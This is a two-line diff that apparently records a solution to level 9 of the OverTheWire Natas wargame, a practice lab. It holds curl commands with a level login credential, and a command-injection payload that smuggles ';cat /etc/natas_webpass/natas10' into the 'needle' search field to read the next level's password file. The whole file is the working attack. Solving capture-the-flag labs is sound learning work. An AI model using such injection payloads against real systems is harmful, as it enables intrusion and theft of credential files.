@@ -1,0 +1,2 @@
+curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org
+curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/?needle=test;cat%20/etc/natas_webpass/natas10&submit=Search
